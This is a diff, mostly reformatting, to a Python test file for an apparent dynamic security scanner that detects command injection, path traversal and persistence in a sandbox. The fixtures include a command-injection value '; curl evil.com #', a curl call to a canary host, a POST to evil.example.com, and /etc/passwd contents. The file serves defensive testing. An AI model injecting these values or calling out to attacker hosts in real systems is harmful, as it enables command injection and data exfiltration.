@@ -10,7 +10,6 @@ import pytest
 from dast.discovery import (
     DISCOVERY_PAYLOADS,
     DiscoveredFinding,
-    DiscoveryPayload,
     _build_plan,
     _events_text,
     _oracle_match,
@@ -19,7 +18,6 @@ from dast.discovery import (
     run_discovery,
 )
 from dast.sandbox.client import SandboxEvent, SandboxPlan, SandboxTrace
-
 
 # ── Stub sandbox client ──────────────────────────────────────────────────────
 
@@ -80,8 +78,7 @@ def test_every_payload_has_at_least_one_oracle_mechanism() -> None:
         has_keyword = bool(p.oracle_keywords)
         has_event_kind = bool(p.oracle_event_kinds)
         assert has_keyword or has_event_kind, (
-            f"{p.cwe} has no oracle (no keywords AND no event_kinds) — "
-            f"can't detect exploitation"
+            f"{p.cwe} has no oracle (no keywords AND no event_kinds) — can't detect exploitation"
         )
         if p.oracle_keywords:
             assert all(isinstance(k, str) and k for k in p.oracle_keywords)
@@ -125,16 +122,27 @@ def test_events_text_only_includes_observation_events() -> None:
     spawn event. Only OBSERVATION events (network_call_captured,
     file_writes_observed, etc.) get fed to the oracle."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
         events=[
             # Meta event — excluded
-            SandboxEvent(event_id="e1", kind="process_spawn",
-                         payload={"cmd": "curl http://argus-discovery-canary.invalid"}),
+            SandboxEvent(
+                event_id="e1",
+                kind="process_spawn",
+                payload={"cmd": "curl http://argus-discovery-canary.invalid"},
+            ),
             # Observation event — included
-            SandboxEvent(event_id="e2", kind="network_call_captured",
-                         payload={"host": "evil.example.com", "method": "POST"}),
+            SandboxEvent(
+                event_id="e2",
+                kind="network_call_captured",
+                payload={"host": "evil.example.com", "method": "POST"},
+            ),
         ],
-        exit_code=0, stdout_excerpt="", stderr_excerpt="", elapsed_ms=10,
+        exit_code=0,
+        stdout_excerpt="",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     events = _events_text(trace)
     # process_spawn excluded — our command text NOT in oracle scope
@@ -146,7 +154,9 @@ def test_events_text_only_includes_observation_events() -> None:
 
 def test_stdout_text_only_returns_stdout_and_stderr() -> None:
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
         events=[SandboxEvent(event_id="e1", kind="network", payload={"host": "evil.example.com"})],
         exit_code=0,
         stdout_excerpt="some output here",
@@ -163,10 +173,20 @@ def test_stdout_text_only_returns_stdout_and_stderr() -> None:
 def test_oracle_match_hits_when_keyword_in_observation_event() -> None:
     """network_call_captured IS an observation event — keyword match counts."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
-        events=[SandboxEvent(event_id="e1", kind="network_call_captured",
-                              payload={"host": "argus-discovery-canary.invalid"})],
-        exit_code=0, stdout_excerpt="", stderr_excerpt="", elapsed_ms=10,
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
+        events=[
+            SandboxEvent(
+                event_id="e1",
+                kind="network_call_captured",
+                payload={"host": "argus-discovery-canary.invalid"},
+            )
+        ],
+        exit_code=0,
+        stdout_excerpt="",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     matched, kws = _oracle_match(trace, ("argus-discovery-canary.invalid", "other"))
     assert matched
@@ -178,10 +198,20 @@ def test_oracle_match_DOES_NOT_fire_on_process_spawn_event() -> None:
     match — that's our own input, not a runtime observation. This is
     the critical fix for v0.0's false-positive issue."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
-        events=[SandboxEvent(event_id="e1", kind="process_spawn",
-                              payload={"cmd": "curl http://argus-discovery-canary.invalid"})],
-        exit_code=0, stdout_excerpt="", stderr_excerpt="", elapsed_ms=10,
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
+        events=[
+            SandboxEvent(
+                event_id="e1",
+                kind="process_spawn",
+                payload={"cmd": "curl http://argus-discovery-canary.invalid"},
+            )
+        ],
+        exit_code=0,
+        stdout_excerpt="",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     matched, kws = _oracle_match(trace, ("argus-discovery-canary.invalid",))
     assert not matched, "process_spawn event must not trigger oracle (our own command)"
@@ -189,9 +219,14 @@ def test_oracle_match_DOES_NOT_fire_on_process_spawn_event() -> None:
 
 def test_oracle_match_misses_when_no_keyword() -> None:
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
         events=[SandboxEvent(event_id="e1", kind="process_exit", payload={"code": 0})],
-        exit_code=0, stdout_excerpt="all good", stderr_excerpt="", elapsed_ms=10,
+        exit_code=0,
+        stdout_excerpt="all good",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     matched, kws = _oracle_match(trace, ("attacker.com", "exfiltration"))
     assert not matched
@@ -203,7 +238,9 @@ def test_oracle_match_does_NOT_fire_on_stdout_for_non_content_oracle() -> None:
     keyword only appears in stdout — the file may have echoed our
     own input. Critical fix from the buggy v0.0 smoke."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
         events=[],  # no events
         exit_code=0,
         stdout_excerpt="argus-discovery-canary.invalid was in the input",
@@ -219,7 +256,9 @@ def test_oracle_match_DOES_fire_on_stdout_for_content_based_oracle() -> None:
     if the file actually read+printed the file. Match against stdout
     is correct here."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
         events=[],  # no events captured
         exit_code=0,
         stdout_excerpt="root:x:0:0:root:/root:/bin/bash",
@@ -232,9 +271,14 @@ def test_oracle_match_DOES_fire_on_stdout_for_content_based_oracle() -> None:
 
 def test_oracle_match_is_case_insensitive_for_content_oracle() -> None:
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
         events=[],
-        exit_code=0, stdout_excerpt="ROOT:X:0:0:root:/root:/bin/bash", stderr_excerpt="", elapsed_ms=10,
+        exit_code=0,
+        stdout_excerpt="ROOT:X:0:0:root:/root:/bin/bash",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     matched, _ = _oracle_match(trace, ("root:x:0:0",))
     assert matched
@@ -248,10 +292,20 @@ def test_event_kind_oracle_matches_any_event_with_listed_kind() -> None:
     network_call_captured event fired is the signal, regardless of host
     or content."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
-        events=[SandboxEvent(event_id="e1", kind="network_call_captured",
-                              payload={"host": "anywhere.example.com"})],
-        exit_code=0, stdout_excerpt="", stderr_excerpt="", elapsed_ms=10,
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
+        events=[
+            SandboxEvent(
+                event_id="e1",
+                kind="network_call_captured",
+                payload={"host": "anywhere.example.com"},
+            )
+        ],
+        exit_code=0,
+        stdout_excerpt="",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     matched, kws = _oracle_match(
         trace,
@@ -266,9 +320,14 @@ def test_event_kind_oracle_no_match_if_kind_absent() -> None:
     """No matching event kind -> no match. Used to avoid false positives
     when the file produces other events but not the targeted kind."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
         events=[SandboxEvent(event_id="e1", kind="process_exit", payload={"code": 0})],
-        exit_code=0, stdout_excerpt="", stderr_excerpt="", elapsed_ms=10,
+        exit_code=0,
+        stdout_excerpt="",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     matched, _ = _oracle_match(
         trace,
@@ -285,12 +344,20 @@ def test_observed_paths_oracle_matches_persistence_target() -> None:
     """CWE-506 persistence: if the file writes to /etc, /.ssh, /.bashrc,
     etc., the file_writes_observed event payload contains the path."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
-        events=[SandboxEvent(
-            event_id="e1", kind="file_writes_observed",
-            payload={"changes": ["/etc/profile.d/malware.sh", "/tmp/build.log"]},
-        )],
-        exit_code=0, stdout_excerpt="", stderr_excerpt="", elapsed_ms=10,
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
+        events=[
+            SandboxEvent(
+                event_id="e1",
+                kind="file_writes_observed",
+                payload={"changes": ["/etc/profile.d/malware.sh", "/tmp/build.log"]},
+            )
+        ],
+        exit_code=0,
+        stdout_excerpt="",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     matched, kws = _oracle_match(
         trace,
@@ -307,12 +374,20 @@ def test_observed_paths_oracle_no_match_for_benign_writes() -> None:
     trigger the persistence oracle. Critical to avoid false positives
     on legitimate files that just write logs."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
-        events=[SandboxEvent(
-            event_id="e1", kind="file_writes_observed",
-            payload={"changes": ["/tmp/output.txt", "/var/log/run.log"]},
-        )],
-        exit_code=0, stdout_excerpt="", stderr_excerpt="", elapsed_ms=10,
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
+        events=[
+            SandboxEvent(
+                event_id="e1",
+                kind="file_writes_observed",
+                payload={"changes": ["/tmp/output.txt", "/var/log/run.log"]},
+            )
+        ],
+        exit_code=0,
+        stdout_excerpt="",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     matched, _ = _oracle_match(
         trace,
@@ -320,9 +395,7 @@ def test_observed_paths_oracle_no_match_for_benign_writes() -> None:
         oracle_event_kinds=("file_writes_observed",),
         oracle_observed_paths=("/etc/", "/.ssh/", "/.bashrc"),
     )
-    assert not matched, (
-        "writes to /tmp and /var/log should NOT match persistence oracle"
-    )
+    assert not matched, "writes to /tmp and /var/log should NOT match persistence oracle"
 
 
 # ── DAST-206: language-aware target invocation ─────────────────────────────
@@ -378,10 +451,20 @@ def test_combined_oracle_matches_either_mechanism() -> None:
     """A payload can use both keyword and event-kind oracles. Either
     matching is sufficient."""
     trace = SandboxTrace(
-        plan_id="p", file_id="f", hypothesis_id="H",
-        events=[SandboxEvent(event_id="e1", kind="network_call_captured",
-                              payload={"host": "anywhere.example.com"})],
-        exit_code=0, stdout_excerpt="", stderr_excerpt="", elapsed_ms=10,
+        plan_id="p",
+        file_id="f",
+        hypothesis_id="H",
+        events=[
+            SandboxEvent(
+                event_id="e1",
+                kind="network_call_captured",
+                payload={"host": "anywhere.example.com"},
+            )
+        ],
+        exit_code=0,
+        stdout_excerpt="",
+        stderr_excerpt="",
+        elapsed_ms=10,
     )
     # Keyword oracle wouldn't match (no canary in events) but event-kind would
     matched, kws = _oracle_match(
@@ -409,15 +492,19 @@ async def test_run_discovery_no_oracle_matches_no_findings() -> None:
 async def test_run_discovery_finds_cwe78_when_oracle_keyword_observed() -> None:
     """Sandbox observes a network_call_captured event with the canary
     domain (oracle for CWE-78) → discovery surfaces a CWE-78 finding."""
-    stub = _StubSandbox({
-        "CWE-78": {
-            "events": [
-                {"kind": "network_call_captured",
-                 "payload": {"host": "argus-discovery-canary.invalid", "method": "GET"}}
-            ],
-            "stdout": "executed: curl http://argus-discovery-canary.invalid/cwe78",
+    stub = _StubSandbox(
+        {
+            "CWE-78": {
+                "events": [
+                    {
+                        "kind": "network_call_captured",
+                        "payload": {"host": "argus-discovery-canary.invalid", "method": "GET"},
+                    }
+                ],
+                "stdout": "executed: curl http://argus-discovery-canary.invalid/cwe78",
+            }
         }
-    })
+    )
     findings, summary = await run_discovery(file_id="vuln.py", sandbox=stub)
     assert len(findings) == 1
     assert findings[0].cwe == "CWE-78"
@@ -431,15 +518,19 @@ async def test_run_discovery_finds_multiple_cwes() -> None:
     """Multiple CWEs can fire on the same file. CWE-78 fires from event
     payload (network canary); CWE-22 fires from stdout content (the
     root:x:0:0 oracle is content-based)."""
-    stub = _StubSandbox({
-        "CWE-78": {
-            "events": [
-                {"kind": "network_call_captured",
-                 "payload": {"host": "argus-discovery-canary.invalid"}}
-            ],
-        },
-        "CWE-22": {"stdout": "root:x:0:0:root:/root:/bin/bash"},
-    })
+    stub = _StubSandbox(
+        {
+            "CWE-78": {
+                "events": [
+                    {
+                        "kind": "network_call_captured",
+                        "payload": {"host": "argus-discovery-canary.invalid"},
+                    }
+                ],
+            },
+            "CWE-22": {"stdout": "root:x:0:0:root:/root:/bin/bash"},
+        }
+    )
     findings, summary = await run_discovery(file_id="multi.py", sandbox=stub)
     assert len(findings) == 2
     cwes_found = {f.cwe for f in findings}
@@ -450,6 +541,7 @@ async def test_run_discovery_finds_multiple_cwes() -> None:
 async def test_run_discovery_handles_sandbox_exception() -> None:
     """If the sandbox raises, we record an error in the summary and
     move on — no finding emitted, no exception propagated."""
+
     class _ExplodingSandbox:
         async def submit(self, plan: SandboxPlan) -> SandboxTrace:
             raise RuntimeError("sandbox is on fire")
@@ -463,14 +555,13 @@ async def test_run_discovery_handles_sandbox_exception() -> None:
 async def test_run_discovery_handles_timeout() -> None:
     """Per-payload timeout is enforced — slow sandbox calls don't hang
     the whole run."""
+
     class _HangingSandbox:
         async def submit(self, plan: SandboxPlan) -> SandboxTrace:
             await asyncio.sleep(10)
             raise AssertionError("should never get here")
 
-    findings, summary = await run_discovery(
-        file_id="x.py", sandbox=_HangingSandbox(), timeout_sec=0.1
-    )
+    findings, summary = await run_discovery(file_id="x.py", sandbox=_HangingSandbox(), timeout_sec=0.1)
     assert findings == []
     assert all(s.get("error") == "timeout" for s in summary)
 
@@ -480,14 +571,18 @@ async def test_run_discovery_returns_diagnostic_summary() -> None:
     """Summary entry is created for every payload attempted, regardless
     of match — used for the 'we tried N payloads' diagnostic in launch
     report."""
-    stub = _StubSandbox({
-        "CWE-78": {
-            "events": [
-                {"kind": "network_call_captured",
-                 "payload": {"host": "argus-discovery-canary.invalid"}}
-            ],
-        },
-    })
+    stub = _StubSandbox(
+        {
+            "CWE-78": {
+                "events": [
+                    {
+                        "kind": "network_call_captured",
+                        "payload": {"host": "argus-discovery-canary.invalid"},
+                    }
+                ],
+            },
+        }
+    )
     _, summary = await run_discovery(file_id="x.py", sandbox=stub)
     assert len(summary) == len(DISCOVERY_PAYLOADS)
     matched_count = sum(1 for s in summary if s["matched"])
@@ -499,9 +594,14 @@ async def test_run_discovery_returns_diagnostic_summary() -> None:
 
 def test_discovered_finding_to_dict_round_trip() -> None:
     f = DiscoveredFinding(
-        finding_id="D001", cwe="CWE-78", cwe_name="cmd", severity="critical",
-        payload="; curl evil.com #", runtime_evidence="dns hit",
-        sandbox_plan_id="p1", sandbox_event_count=3,
+        finding_id="D001",
+        cwe="CWE-78",
+        cwe_name="cmd",
+        severity="critical",
+        payload="; curl evil.com #",
+        runtime_evidence="dns hit",
+        sandbox_plan_id="p1",
+        sandbox_event_count=3,
     )
     d = f.to_dict()
     assert d["finding_id"] == "D001"
